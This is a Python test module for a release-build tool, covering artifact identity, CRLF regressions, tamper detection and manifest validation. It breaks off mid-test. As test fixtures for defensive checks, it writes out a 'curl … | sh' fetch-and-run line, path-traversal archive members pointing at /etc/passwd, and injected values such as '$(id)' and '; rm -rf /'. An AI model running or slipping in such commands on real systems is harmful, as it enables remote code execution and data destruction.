"""W0-09A artifact identity, CRLF regression, build inputs, target/tree checks, tamper detection,
manifest/record validation. Pure Python (no bash): runs on the Windows release PC and on Linux.

The synthetic repository is configured like the W0-02 release PC (core.autocrlf=true) for
every test in this module.
"""
import copy
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest

from harness import (LIVE_NGINX_BLOB, RELEASE_DIR, REPO_ROOT, SECRET_JWT, SECRET_MONGO_PASSWORD, build, make_repo,
                     read_bytes, read_json, read_text, real_blob, run_git, verify)
from beg_release import gitobj, inputs, manifest as mf
from beg_release.gitobj import ReleaseError

W0_02_TARGET = "0b53bcd5b977ee27de8d4cee363fed41dd897482"
W0_02_TARGET_TREE = "4c3e88550370577481d29e43753573beb1ead6c7"

_FX = {}


def has_commit(repo, sha):
    return subprocess.run(["git", "-C", repo, "cat-file", "-e", sha + "^{commit}"], capture_output=True).returncode == 0


def try_build(commit, *extra, repo=None, environment="production"):
    out = tempfile.mkdtemp(prefix="out-", dir=_FX["tmp"])
    return build(repo or _FX["repo"], commit, out, *extra, environment=environment)


def ok_build(commit, *extra, **kw):
    p, bundle = try_build(commit, *extra, **kw)
    if not bundle:
        raise AssertionError("build failed: %s %s" % (p.stdout, p.stderr))
    return bundle


def manifest_of(bundle):
    return os.path.join(bundle, "manifest.json")


def fx():
    if not _FX:
        tmp = tempfile.mkdtemp(prefix="w009a-art-")
        repo = os.path.join(tmp, "repo")
        c = make_repo(repo)
        run_git(repo, "config", "core.autocrlf", "true")  # the W0-02 release PC setting
        run_git(repo, "config", "core.eol", "crlf")
        _FX.update(tmp=tmp, repo=repo, c=c)
        _FX["b0"] = ok_build(c["c0"], "--no-previous", "--baseline", "--legacy-extra", "nginx.conf=" + LIVE_NGINX_BLOB)
        _FX["b1"] = ok_build(c["c1"], "--previous-manifest", manifest_of(_FX["b0"]))
        _FX["b2"] = ok_build(c["c2"], "--previous-manifest", manifest_of(_FX["b1"]))
        _FX["b3"] = ok_build(c["c3"], "--previous-manifest", manifest_of(_FX["b2"]))
    return _FX


def tearDownModule():
    if _FX:
        shutil.rmtree(_FX["tmp"], ignore_errors=True)


def commit_with(parent, changes, branch):
    """Commit on top of ``parent`` with plumbing only (no working tree, no filters) and point
    refs/heads/<branch> at it; main is never moved."""
    repo = _FX["repo"]
    env = dict(os.environ, GIT_INDEX_FILE=os.path.join(repo, ".git", "index-" + branch))

    def git(*args, data=None):
        p = subprocess.run(["git", "-C", repo, *args], input=data, capture_output=True, env=env)
        if p.returncode:
            raise RuntimeError(p.stderr.decode())
        return p.stdout.decode().strip()

    git("read-tree", parent)
    for path, data in changes.items():
        if data is None:
            git("update-index", "--force-remove", path)
        else:
            raw = data if isinstance(data, bytes) else data.encode("utf-8")
            blob = git("hash-object", "-w", "--no-filters", "--stdin", data=raw)
            git("update-index", "--add", "--cacheinfo", "100644,%s,%s" % (blob, path))
    commit = git("commit-tree", git("write-tree"), "-p", parent, "-m", branch)
    git("update-ref", "refs/heads/" + branch, commit)
    os.remove(env["GIT_INDEX_FILE"])
    return commit


def assert_artifact_identical(tc, repo, ref):
    commit, tree, ctime = gitobj.resolve_commit(repo, ref)
    entries = gitobj.ls_tree(repo, commit)
    blobs = gitobj.read_blobs(repo, [s for _, s in entries.values()])
    tc.assertEqual(gitobj.tree_sha(entries), tree)
    data = gitobj.build_tar(entries, blobs, ctime)
    tc.assertEqual(data, gitobj.build_tar(entries, blobs, ctime), "artifact must be deterministic")
    with tempfile.TemporaryDirectory(prefix="w009a-id-") as tmp:
        path = os.path.join(tmp, "artifact.tar")
        with open(path, "wb") as f:
            f.write(data)
        tar_tree, members = gitobj.tree_sha_of_tar(path)
        tc.assertEqual(tar_tree, tree)
        tc.assertEqual(sorted(members), sorted(entries))
        for p, (mode, sha, content) in members.items():
            tc.assertEqual((mode, sha), entries[p], p)
            tc.assertEqual(content, blobs[entries[p][1]], p)
        dest = os.path.join(tmp, "extracted")
        gitobj.safe_extract(path, dest)
        ok, detail = gitobj.verify_dir_tree(dest, tree, mode_hint={p: m for p, (m, _) in entries.items()})
        tc.assertTrue(ok, detail)
    return tree, members


def reseal(bundle, doc=None, rehash=True):
    """Rewrite manifest.json / SHA256SUMS consistently, as a careless hand-edit or an attacker would."""
    if doc is not None:
        if rehash:
            doc["release_sha256"] = mf.release_sha256(doc["release"])
        with open(manifest_of(bundle), "wb") as f:
            f.write((json.dumps(doc, indent=2, sort_keys=True, ensure_ascii=False) + "\n").encode("utf-8"))
    sums = os.path.join(bundle, "SHA256SUMS")
    names = [line.split("  ", 1)[1] for line in read_text(sums).splitlines() if line]
    with open(sums, "wb") as f:
        f.write("".join("%s  %s\n" % (gitobj.sha256_file(os.path.join(bundle, *n.split("/"))), n)
                        for n in sorted(names)).encode("ascii"))


class BuildAsserts(unittest.TestCase):
    def assert_build_fails(self, commit, needle, *extra, **kw):
        p, bundle = try_build(commit, *extra, **kw)
        self.assertIsNone(bundle, "build unexpectedly succeeded")
        self.assertEqual(p.returncode, 2, p.stdout + p.stderr)
        self.assertIn(needle, p.stderr)
        return p


# --------------------------------------------------------------------------- identity
class ArtifactIdentityTests(unittest.TestCase):
    def test_real_repository_head_artifact_is_byte_identical_to_git_tree(self):
        assert_artifact_identical(self, REPO_ROOT, "HEAD")

    def test_exec_bit_is_part_of_the_identity(self):
        f = fx()
        tree, members = assert_artifact_identical(self, f["repo"], f["c"]["c0"])
        self.assertEqual(members["tools/run.sh"][0], gitobj.MODE_EXEC)
        flipped = {p: (m, s) for p, (m, s, _) in members.items()}
        flipped["tools/run.sh"] = (gitobj.MODE_FILE, flipped["tools/run.sh"][1])
        self.assertNotEqual(gitobj.tree_sha(flipped), tree)

    def test_exec_bits_are_checked_on_disk_or_taken_from_the_artifact(self):
        f = fx()
        entries = gitobj.ls_tree(f["repo"], f["c"]["c0"])
        tree = run_git(f["repo"], "rev-parse", f["c"]["c0"] + "^{tree}")
        hint = {p: m for p, (m, _) in entries.items()}
        dest = os.path.join(tempfile.mkdtemp(dir=f["tmp"]), "x")
        path = os.path.join(f["b0"], "artifact.tar")
        gitobj.safe_extract(path, dest)
        preserved = gitobj.fs_preserves_modes(os.path.dirname(dest))
        self.assertEqual(preserved, os.name != "nt")
        ok, detail = gitobj.verify_dir_tree(dest, tree, mode_hint=hint, fs_modes=False)
        self.assertTrue(ok, detail)
        self.assertIn("exec bits from the release artifact", detail)
        ok, detail = gitobj.verify_dir_tree(dest, tree, fs_modes=False)  # no hint: fails closed
        self.assertFalse(ok)
        self.assertIn("no artifact mode hint", detail)
        if preserved:
            ok, detail = gitobj.verify_dir_tree(dest, tree, mode_hint=hint, fs_modes=True)
            self.assertTrue(ok, detail)
            os.chmod(os.path.join(dest, "tools", "run.sh"), 0o644)  # lost exec bit is detected on disk
            ok, detail = gitobj.verify_dir_tree(dest, tree, mode_hint=hint, fs_modes=True)
            self.assertFalse(ok)

    def test_bundle_is_reproducible_apart_from_build_time(self):
        f = fx()
        again = ok_build(f["c"]["c1"], "--previous-manifest", manifest_of(f["b0"]))
        self.assertEqual(read_bytes(os.path.join(again, "artifact.tar")), read_bytes(os.path.join(f["b1"], "artifact.tar")))
        a, b = read_json(manifest_of(again))["release"], read_json(manifest_of(f["b1"]))["release"]
        for r in (a, b):
            for volatile in ("release_id", "created_at"):
                r.pop(volatile)
        self.assertEqual(a, b)


class CrlfRegressionTests(unittest.TestCase):
    """W0-02 incident: the deploy artifact came from `git archive` on a PC whose system gitconfig has
    core.autocrlf=true, so LF files arrived with CRLF and the bash wrapper broke on Synology."""

    @staticmethod
    def git_archive_mismatches(repo, commit, *config):
        data = subprocess.run(["git", "-C", repo, *config, "archive", "--format=tar", commit],
                              capture_output=True, check=True).stdout
        entries = gitobj.ls_tree(repo, commit)
        bad, total = [], 0
        with tarfile.open(fileobj=io.BytesIO(data), mode="r:") as tar:
            for m in tar:
                if m.isreg():
                    total += 1
                    content = tar.extractfile(m).read()
                    if gitobj.blob_sha(content) != entries[m.name][1]:
                        bad.append((m.name, content))
        return bad, total

    def test_negative_control_git_archive_is_not_identical_under_autocrlf(self):
        f = fx()
        bad, _ = self.git_archive_mismatches(f["repo"], f["c"]["c1"])
        self.assertTrue(bad, "control failed: git archive did not convert with core.autocrlf=true")
        self.assertTrue(all(b"\r\n" in content for _, content in bad))
        self.assertIn("ops/release/synology/lib.sh", [p for p, _ in bad])

    def test_builder_output_is_identical_despite_autocrlf(self):
        f = fx()
        self.assertEqual(run_git(f["repo"], "config", "core.autocrlf"), "true")
        bundle, commit = f["b1"], f["c"]["c1"]
        doc = read_json(manifest_of(bundle))
        tree = run_git(f["repo"], "rev-parse", commit + "^{tree}")
        self.assertEqual(doc["release"]["app"]["tree"], tree)
        self.assertIs(doc["release"]["artifact"]["tree_verified"], True)
        tar_tree, members = gitobj.tree_sha_of_tar(os.path.join(bundle, "artifact.tar"))
        self.assertEqual(tar_tree, tree)
        entries = gitobj.ls_tree(f["repo"], commit)
        blobs = gitobj.read_blobs(f["repo"], [s for _, s in entries.values()])
        for path, (_mode, _sha, content) in members.items():
            self.assertEqual(content, blobs[entries[path][1]], path)
        for rel in ("tools/synology/lib.sh", "tools/synology/release_deploy.sh", "tools/release_verify.py"):
            self.assertNotIn(b"\r", read_bytes(os.path.join(bundle, *rel.split("/"))), rel)
        v = verify("bundle", "--bundle", bundle)
        self.assertEqual(v.returncode, 0, v.stdout)
        self.assertIn("[PASS] artifact.tree_identity", v.stdout)

    @unittest.skipUnless(has_commit(REPO_ROOT, W0_02_TARGET), "W0-02 release commit not in this clone")
    def test_real_w0_02_commit_git_archive_differs_but_builder_is_identical(self):
        bad, total = self.git_archive_mismatches(REPO_ROOT, W0_02_TARGET, "-c", "core.autocrlf=true")
        self.assertTrue(bad, "control failed on the real W0-02 commit")
        tree, members = assert_artifact_identical(self, REPO_ROOT, W0_02_TARGET)
        self.assertEqual(tree, W0_02_TARGET_TREE)
        self.assertEqual(len(members), total)


# ----------------------------------------------------------------------- build inputs
class BuildInputTests(BuildAsserts):
    def test_hidden_nginx_conf_fails_when_neither_versioned_nor_declared(self):
        self.assert_build_fails(fx()["c"]["c0"], "missing build input: 'nginx.conf'", "--no-previous")

    def test_missing_copy_source_fails(self):
        c = commit_with(fx()["c"]["c3"], {"backend/requirements.txt": None}, "no-requirements")
        self.assert_build_fails(c, "missing build input: 'backend/requirements.txt'",
                                "--no-previous", "--reachable-from", "no-requirements")

    def test_unversioned_layout_file_fails(self):
        c = commit_with(fx()["c"]["c3"], {"ops/synology/deploy/Dockerfile.frontend": None}, "no-dockerfile")
        self.assert_build_fails(c, "missing build input: layout files not versioned",
                                "--no-previous", "--reachable-from", "no-dockerfile")

    def test_compose_drift_fails(self):
        compose = real_blob("ops/synology/deploy/docker-compose.yml").replace(
            b"container_name: begwork-frontend", b"container_name: begwork-web")
        c = commit_with(fx()["c"]["c3"], {"ops/synology/deploy/docker-compose.yml": compose}, "compose-drift")
        self.assert_build_fails(c, "compose drift for service frontend", "--no-previous", "--reachable-from", "compose-drift")

    def test_versioned_env_file_fails_without_printing_it(self):
        c = commit_with(fx()["c"]["c3"], {"backend/.env": "JWT_SECRET=%s\n" % SECRET_JWT}, "env-file")
        p = self.assert_build_fails(c, "secret-bearing .env file(s) are versioned", "--no-previous", "--reachable-from", "env-file")
        self.assertNotIn(SECRET_JWT, p.stdout + p.stderr)

    def test_unsupported_dockerfile_forms_fail_closed(self):
        for text in ('FROM x\nCOPY ["a", "b"]\n', "FROM x\nCOPY src/*.py /app/\n",
                     "FROM x\nADD https://example.invalid/a /a\n", "FROM x\nCOPY onlyone\n"):
            with self.subTest(text=text), self.assertRaises(ReleaseError):
                inputs.parse_dockerfile(text)
        parsed = inputs.parse_dockerfile(real_blob("ops/synology/deploy/Dockerfile.frontend").decode("utf-8"))
        self.assertEqual(parsed["base_images"], ["node:20-alpine", "nginx:alpine"])
        self.assertEqual(parsed["sources"], ["frontend/package.json", "frontend/yarn.lock", "frontend/", "nginx.conf"])

    def test_services_to_rebuild_follow_input_fingerprints(self):
        f = fx()
        rel = lambda b: read_json(manifest_of(b))["release"]  # noqa: E731
        self.assertEqual(rel(f["b0"])["services_to_rebuild"], ["backend", "frontend"])  # no previous: everything
        self.assertEqual(rel(f["b1"])["services_to_rebuild"], ["backend"])  # nginx.conf now tracked, same bytes
        self.assertEqual(rel(f["b0"])["build"]["services"]["frontend"]["fingerprint"],
                         rel(f["b1"])["build"]["services"]["frontend"]["fingerprint"])
        self.assertEqual(rel(f["b2"])["services_to_rebuild"], ["frontend"])
        self.assertEqual(rel(f["b3"])["services_to_rebuild"], [])  # docs only
        c = commit_with(f["c"]["c3"], {"nginx.conf": real_blob("nginx.conf") + b"# changed\n"}, "nginx-change")
        b = ok_build(c, "--previous-manifest", manifest_of(f["b3"]), "--reachable-from", "nginx-change")
        self.assertEqual(rel(b)["services_to_rebuild"], ["frontend"])
        self.assertEqual(sorted(rel(b)["build"]["unpinned_base_images"]), ["nginx:alpine", "node:20-alpine", "python:3.11-slim"])

    @unittest.skipUnless(has_commit(REPO_ROOT, W0_02_TARGET), "W0-02 release commit not in this clone")
    def test_real_repo_first_release_after_adopting_w0_02_rebuilds_nothing(self):
        diff = subprocess.run(["git", "-C", REPO_ROOT, "diff", "--quiet", W0_02_TARGET, "HEAD", "--", "backend", "frontend"])
        if diff.returncode != 0:
            self.skipTest("backend/frontend changed since W0-02; the no-rebuild expectation no longer applies")
        p, base = try_build(W0_02_TARGET, "--no-previous", "--baseline", "--legacy-extra", "nginx.conf=" + LIVE_NGINX_BLOB,
                            "--tools-ref", "HEAD", "--allow-unmerged", repo=REPO_ROOT, environment="test")
        self.assertIsNotNone(base, p.stderr)
        p, head = try_build("HEAD", "--previous-manifest", manifest_of(base), "--allow-unmerged",
                            repo=REPO_ROOT, environment="test")
        self.assertIsNotNone(head, p.stderr)
        self.assertEqual(json.loads(p.stdout)["services_to_rebuild"], [])
        self.assertEqual(read_json(manifest_of(base))["release"]["app"]["tree"], W0_02_TARGET_TREE)


# ------------------------------------------------------------------ target / tree
class TargetTests(BuildAsserts):
    def test_unknown_commit_fails(self):
        self.assert_build_fails("0" * 40, "RELEASE BUILD FAILED", "--no-previous")

    def test_production_target_must_be_reachable_from_release_ref(self):
        c = commit_with(fx()["c"]["c3"], {"docs/side.md": "side\n"}, "side-branch")
        self.assert_build_fails(c, "is not reachable from main", "--no-previous")

    def test_allow_unmerged_is_refused_for_production(self):
        self.assert_build_fails(fx()["c"]["c1"], "not allowed for production", "--no-previous", "--allow-unmerged")

    def test_allow_unmerged_outside_production_records_no_release_ref(self):
        c = commit_with(fx()["c"]["c3"], {"docs/side2.md": "side\n"}, "side-branch-2")
        b = ok_build(c, "--no-previous", "--allow-unmerged", environment="test")
        self.assertIsNone(read_json(manifest_of(b))["release"]["app"]["reachable_from"])

    def test_previous_release_must_be_an_ancestor(self):
        f = fx()
        self.assert_build_fails(f["c"]["c1"], "is not an ancestor", "--previous-manifest", manifest_of(f["b2"]))

    def test_target_equal_to_previous_fails(self):
        f = fx()
        self.assert_build_fails(f["c"]["c2"], "equals the previous release commit", "--previous-manifest", manifest_of(f["b2"]))

    def test_previous_from_another_environment_fails(self):
        f = fx()
        self.assert_build_fails(f["c"]["c3"], "belongs to synology-begwork/production",
                                "--previous-manifest", manifest_of(f["b2"]), environment="staging")

    def test_previous_must_be_explicit(self):
        self.assert_build_fails(fx()["c"]["c1"], "pass --previous-manifest")

    def test_legacy_extra_only_for_baseline(self):
        self.assert_build_fails(fx()["c"]["c1"], "only allowed for a --baseline", "--no-previous",
                                "--legacy-extra", "x.conf=" + LIVE_NGINX_BLOB)

    def test_tree_verification_detects_wrong_tree_and_extra_files(self):
        f = fx()
        stage = os.path.join(tempfile.mkdtemp(dir=f["tmp"]), "stage")
        v = verify("bundle", "--bundle", f["b1"], "--stage", stage)
        self.assertEqual(v.returncode, 0, v.stdout)
        self.assertIn("[PASS] stage.tree_identity", v.stdout)
        hint = os.path.join(f["b1"], "artifact.tar")
        t1 = run_git(f["repo"], "rev-parse", f["c"]["c1"] + "^{tree}")
        t0 = run_git(f["repo"], "rev-parse", f["c"]["c0"] + "^{tree}")
        self.assertEqual(verify("tree", "--dir", stage, "--tree", t1, "--mode-hint-tar", hint).returncode, 0)
        wrong = verify("tree", "--dir", stage, "--tree", t0, "--mode-hint-tar", hint)
        self.assertEqual(wrong.returncode, 2)
        self.assertIn("tree mismatch", wrong.stdout)
        bad_extra = verify("tree", "--dir", stage, "--tree", t1, "--mode-hint-tar", hint, "--allow-extra", "nginx.conf=" + "0" * 40)
        self.assertEqual(bad_extra.returncode, 2)
        self.assertIn("legacy extra nginx.conf has unexpected content", bad_extra.stdout)
        with open(os.path.join(stage, "backend", "debug.py"), "w", newline="\n") as fh:
            fh.write("print('left behind')\n")
        extra = verify("tree", "--dir", stage, "--tree", t1, "--mode-hint-tar", hint)
        self.assertEqual(extra.returncode, 2)
        self.assertIn("tree mismatch", extra.stdout)

    def test_stage_directory_must_be_new(self):
        f = fx()
        stage = tempfile.mkdtemp(dir=f["tmp"])
        v = verify("bundle", "--bundle", f["b1"], "--stage", stage)
        self.assertEqual(v.returncode, 2)
        self.assertIn("staging directory already exists", v.stdout)


# ------------------------------------------------------------------------ tampering
class TamperTests(unittest.TestCase):
    def copy_bundle(self):
        dst = os.path.join(tempfile.mkdtemp(dir=fx()["tmp"]), "bundle")
        shutil.copytree(fx()["b1"], dst)
        return dst

    def verify_fails(self, bundle, needle):
        v = verify("bundle", "--bundle", bundle)
        self.assertEqual(v.returncode, 2, v.stdout)
        self.assertIn(needle, v.stdout)
        self.assertIn("RESULT FAIL", v.stdout)
        return v

    def test_untampered_copy_passes(self):
        v = verify("bundle", "--bundle", self.copy_bundle())
        self.assertEqual(v.returncode, 0, v.stdout)

    def test_flipped_artifact_byte_fails_checksum(self):
        b = self.copy_bundle()
        with open(os.path.join(b, "artifact.tar"), "r+b") as fh:
            fh.seek(1024)
            byte = fh.read(1)
            fh.seek(1024)
            fh.write(bytes([byte[0] ^ 0x20]))
        self.verify_fails(b, "[FAIL] sha256sums.match - mismatch: ['artifact.tar']")

    def test_resealed_artifact_with_changed_file_fails_tree_identity(self):
        b = self.copy_bundle()
        path = os.path.join(b, "artifact.tar")
        members = gitobj.tar_entries(path)
        entries = {p: (m, s) for p, (m, s, _) in members.items()}
        blobs = {s: d for (_m, s, d) in members.values()}
        evil = b"print('patched on the release PC')\n"
        entries["backend/server.py"] = (gitobj.MODE_FILE, gitobj.blob_sha(evil))
        blobs[gitobj.blob_sha(evil)] = evil
        data = gitobj.build_tar(entries, blobs, 1)
        with open(path, "wb") as fh:
            fh.write(data)
        doc = read_json(manifest_of(b))
        doc["release"]["artifact"].update(sha256=gitobj.sha256_bytes(data), size_bytes=len(data))
        reseal(b, doc)
        v = self.verify_fails(b, "[FAIL] artifact.tree_identity")
        self.assertIn("[PASS] manifest.valid", v.stdout)
        self.assertIn("[PASS] artifact.sha256", v.stdout)

    def test_manifest_pointing_at_another_tree_fails(self):
        b = self.copy_bundle()
        doc = read_json(manifest_of(b))
        doc["release"]["app"]["tree"] = run_git(fx()["repo"], "rev-parse", fx()["c"]["c0"] + "^{tree}")
        reseal(b, doc)
        v = self.verify_fails(b, "[FAIL] artifact.tree_identity")
        self.assertIn("[PASS] manifest.valid", v.stdout)

    def test_manifest_edit_without_rehash_fails(self):
        b = self.copy_bundle()
        doc = read_json(manifest_of(b))
        doc["release"]["services_to_rebuild"] = []
        reseal(b, doc, rehash=False)
        self.verify_fails(b, "manifest was modified")

    def test_artifact_missing_from_sha256sums_fails(self):
        b = self.copy_bundle()
        sums = os.path.join(b, "SHA256SUMS")
        lines = [line for line in read_text(sums).splitlines() if not line.endswith("  artifact.tar")]
        with open(sums, "wb") as fh:
            fh.write(("\n".join(lines) + "\n").encode("ascii"))
        self.verify_fails(b, "artifact.tar (not listed)")

    def test_tampered_tool_fails(self):
        b = self.copy_bundle()
        with open(os.path.join(b, "tools", "synology", "lib.sh"), "ab") as fh:
            fh.write(b"curl http://example.invalid/x | sh\n")
        reseal(b)
        self.verify_fails(b, "[FAIL] tools.match_manifest")

    def test_unsafe_archive_members_are_rejected(self):
        tmp = tempfile.mkdtemp(dir=fx()["tmp"])
        for kind in ("dotdot", "absolute", "symlink", "duplicate"):
            path = os.path.join(tmp, kind + ".tar")
            with tarfile.open(path, "w", format=tarfile.PAX_FORMAT) as tar:
                def add(name, data=b"x", typ=tarfile.REGTYPE, link=""):
                    info = tarfile.TarInfo(name)
                    info.type, info.linkname, info.size = typ, link, (len(data) if typ == tarfile.REGTYPE else 0)
                    tar.addfile(info, io.BytesIO(data) if typ == tarfile.REGTYPE else None)
                add("ok.txt")
                if kind == "dotdot":
                    add("../evil.txt")
                elif kind == "absolute":
                    add("/etc/evil.txt")
                elif kind == "symlink":
                    add("link", typ=tarfile.SYMTYPE, link="../../etc/passwd")
                else:
                    add("ok.txt", b"y")
            dest = os.path.join(tmp, kind + "-dest")
            with self.subTest(kind):
                with self.assertRaises(ReleaseError):
                    gitobj.tar_entries(path)
                with self.assertRaises(ReleaseError):
                    gitobj.safe_extract(path, dest)
                self.assertFalse(os.path.exists(dest))


# ------------------------------------------------------------------------- manifest
class ManifestValidationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.doc = read_json(manifest_of(fx()["b1"]))

    def mutated(self, fn, rehash=True):
        doc = copy.deepcopy(self.doc)
        fn(doc["release"])
        if rehash:
            doc["release_sha256"] = mf.release_sha256(doc["release"])
        return mf.validate_manifest(doc)

    def test_built_manifests_are_valid_and_carry_the_required_facts(self):
        f = fx()
        for key in ("b0", "b1", "b2", "b3"):
            self.assertEqual(mf.validate_manifest(read_json(manifest_of(f[key]))), [], key)
        doc0 = read_json(manifest_of(f["b0"]))
        r = self.doc["release"]
        self.assertEqual(self.doc["schema"], "beg.release-manifest/v1")
        self.assertEqual((r["app"]["commit"], r["app"]["reachable_from"]), (f["c"]["c1"], "main"))
        self.assertEqual(r["app"]["tree"], run_git(f["repo"], "rev-parse", f["c"]["c1"] + "^{tree}"))
        self.assertEqual(r["artifact"]["sha256"], gitobj.sha256_file(os.path.join(f["b1"], "artifact.tar")))
        self.assertEqual(r["environment"], "production")
        self.assertEqual(r["deployment"], {"id": "synology-begwork", "layout": "synology-compose-repo-copy-v1",
                                           "tenant_scope": {"mode": "deployment-wide", "tenants": []}})
        self.assertEqual(r["schema_version"]["migrations"], {"declared": [], "policy": "NOT_RUN_BY_DEFAULT", "approval_ref": None})
        self.assertRegex(r["configuration"]["version"], r"^[0-9a-f]{64}$")
        self.assertEqual(r["feature_flags"]["PERMISSION_SERVICE_MODE"]["expected"], "off")
        self.assertEqual(r["entitlements"]["status"], "NOT_IMPLEMENTED")
        self.assertEqual(r["previous"]["release_id"], doc0["release"]["release_id"])
        self.assertEqual(r["previous"]["release_sha256"], doc0["release_sha256"])
        self.assertEqual(r["rollback_target"], r["previous"])
        self.assertIn({"type": "deploy", "ref": "test-approval"}, r["approvals"])
        self.assertEqual(r["created_by"], "tester")
        self.assertEqual(doc0["release"]["artifact"]["legacy_extras"], {"nginx.conf": LIVE_NGINX_BLOB})
        v = verify("manifest", "--manifest", manifest_of(f["b1"]))
        self.assertEqual(v.returncode, 0, v.stdout)

    def test_invalid_manifests_are_rejected(self):
        secret_uri = "mongodb+srv://beg:%s@cluster.example.invalid/db" % SECRET_MONGO_PASSWORD
        cases = [
            ("unknown key", lambda r: r.update(surprise=1), "unknown keys ['surprise']"),
            ("missing key", lambda r: r.pop("rollback_target"), "missing keys ['rollback_target']"),
            ("commit", lambda r: r["app"].update(commit="HEAD"), "release.app.commit: must be a 40-hex commit"),
            ("release id", lambda r: r.update(release_id="rel-20260101T000000Z-000000000000"), "must end with the first 12 hex"),
            ("tree not verified", lambda r: r["artifact"].update(tree_verified=False), "tree_verified: must be true"),
            ("migration policy", lambda r: r["schema_version"]["migrations"].update(policy="RUN_ON_DEPLOY"), "NOT_RUN_BY_DEFAULT"),
            ("migration without approval", lambda r: r["schema_version"]["migrations"].update(
                declared=["w0_02_bootstrap"], approval_ref=None), "separate approval reference"),
            ("no deploy approval", lambda r: r.update(approvals=[{"type": "review", "ref": "x"}]), "requires a deploy approval"),
            ("rollback target", lambda r: r.update(rollback_target=None), "must equal release.previous"),
            ("unknown service", lambda r: r.update(services_to_rebuild=["worker"]), "unknown services ['worker']"),
            ("log service", lambda r: r["smoke"].update(log_service="worker"), "must be one of the built services"),
            ("base url", lambda r: r["smoke"].update(base_url="http://127.0.0.1:8080/$(id)"), "release.smoke.base_url"),
            ("flag value", lambda r: r["feature_flags"]["PERMISSION_SERVICE_MODE"].update(expected="off;reboot"),
             "release.feature_flags.PERMISSION_SERVICE_MODE"),
            ("secret value", lambda r: r["approvals"].append({"type": "review", "ref": secret_uri}), "secret-like value"),
            ("secret key", lambda r: r["configuration"]["build_args"]["frontend"].update(JWT_SECRET="abcdef0123456789"),
             "secret-like key carries a value"),
            ("environment", lambda r: r.update(environment="prod"), "release.environment"),
            ("created_at", lambda r: r.update(created_at="yesterday"), "release.created_at"),
        ]
        for name, fn, needle in cases:
            with self.subTest(name):
                errors = self.mutated(fn)
                self.assertTrue(any(needle in e for e in errors), errors)
                self.assertNotIn(SECRET_MONGO_PASSWORD, "\n".join(errors))

    def test_release_hash_detects_any_edit(self):
        errors = self.mutated(lambda r: r.update(created_by="someone-else"), rehash=False)
        self.assertEqual(errors, ["manifest.release_sha256: does not match the canonical hash of release (manifest was modified)"])

    def test_json_schema_file_mirrors_the_validator(self):
        schema = read_json(os.path.join(RELEASE_DIR, "release_manifest.schema.json"))
        defs = schema["$defs"]
        nodes = {"manifest": schema, "tenant_scope": defs["deployment"]["properties"]["tenant_scope"],
                 "migrations": defs["schema_version"]["properties"]["migrations"]}
        for kind, required in mf.REQUIRED.items():
            node = nodes.get(kind) or defs[kind]
            with self.subTest(kind):
                self.assertEqual(sorted(node["required"]), sorted(required))
                self.assertEqual(sorted(node["properties"]), sorted(required))
                self.assertIs(node["additionalProperties"], False)

    def test_build_outputs_carry_no_secrets_from_the_environment(self):
        f = fx()
        env = dict(os.environ, JWT_SECRET=SECRET_JWT,
                   MONGO_URL="mongodb+srv://beg:%s@cluster.example.invalid/db" % SECRET_MONGO_PASSWORD)
        out = tempfile.mkdtemp(dir=f["tmp"])
        p = subprocess.run([sys.executable, os.path.join(RELEASE_DIR, "release_build.py"), "--repo", f["repo"],
                            "--commit", f["c"]["c2"], "--environment", "production", "--deployment-id", "synology-begwork",
                            "--out", out, "--reachable-from", "main", "--approval", "deploy:test-approval",
                            "--previous-manifest", manifest_of(f["b1"])], capture_output=True, text=True, env=env)
        self.assertEqual(p.returncode, 0, p.stderr)
        bundle = json.loads(p.stdout)["bundle"]
        text = p.stdout + p.stderr + read_text(manifest_of(bundle)) + read_text(os.path.join(bundle, "SHA256SUMS"))
        for secret in (SECRET_JWT, SECRET_MONGO_PASSWORD):
            self.assertNotIn(secret, text)
            self.assertNotIn(secret.encode(), read_bytes(os.path.join(bundle, "artifact.tar")))

    def test_layout_verification_never_prints_env_values(self):
        f = fx()
        base = tempfile.mkdtemp(dir=f["tmp"])
        for name in ("docker-compose.yml", "Dockerfile.backend", "Dockerfile.frontend"):
            with open(os.path.join(base, name), "wb") as fh:
                fh.write(real_blob("ops/synology/deploy/" + name))
        with open(os.path.join(base, ".env"), "w", newline="\n") as fh:
            fh.write("MONGO_URL=mongodb+srv://beg:%s@cluster.example.invalid/db\nJWT_SECRET=%s\n"
                     "PERMISSION_SERVICE_MODE=enforce\n" % (SECRET_MONGO_PASSWORD, SECRET_JWT))
        v = verify("bundle", "--bundle", f["b1"], "--base", base, "--mode", "deploy")
        self.assertEqual(v.returncode, 2)
        self.assertIn("[FAIL] env.required_keys - missing key names: ['DB_NAME', 'BEG_SYSTEM_DB', 'PUBLIC_URL', 'CORS_ORIGINS']", v.stdout)
        self.assertIn("[FAIL] flag.PERMISSION_SERVICE_MODE", v.stdout)
        for secret in (SECRET_JWT, SECRET_MONGO_PASSWORD, "enforce"):
            self.assertNotIn(secret, v.stdout + v.stderr)


class RecordAndPlanTests(unittest.TestCase):
    def valid_record(self):
        doc = read_json(manifest_of(fx()["b1"]))
        r = doc["release"]
        return {"schema": mf.RECORD_SCHEMA, "action": "deploy", "status": "DEPLOYED", "release_id": r["release_id"],
                "release_sha256": doc["release_sha256"], "commit": r["app"]["commit"], "tree": r["app"]["tree"],
                "environment": "production", "deployment_id": "synology-begwork", "started_at": "2026-09-13T10:00:00Z",
                "finished_at": "2026-09-13T10:05:00Z", "actor": "krum", "previous_release_id": r["previous"]["release_id"],
                "rollback_target_release_id": r["previous"]["release_id"], "services_rebuilt": ["backend"],
                "migrations": "NOT_RUN", "verification": "PASS", "smoke": "PASS", "failure": "",
                "evidence_dir": "/volume1/docker/begwork/release-state/history/20260913T100000Z-deploy-123"}

    def test_record_validation(self):
        self.assertEqual(mf.validate_record(self.valid_record()), [])
        cases = [
            ("migrations run", {"migrations": "RUN"}, "must be NOT_RUN"),
            ("status", {"status": "OK"}, "record.status"),
            ("secret in failure", {"failure": "auth failed mongodb://beg:%s@host" % SECRET_MONGO_PASSWORD}, "record.failure"),
            ("evidence dir", {"evidence_dir": "/tmp/x; rm -rf /"}, "record.evidence_dir"),
            ("unknown key", {"stdout": "x"}, "unknown keys ['stdout']"),
        ]
        for name, change, needle in cases:
            with self.subTest(name):
                rec = self.valid_record()
                rec.update(change)
                errors = mf.validate_record(rec)
                self.assertTrue(any(needle in e for e in errors), errors)

    def test_plan_is_shell_safe_and_complete(self):
        f = fx()
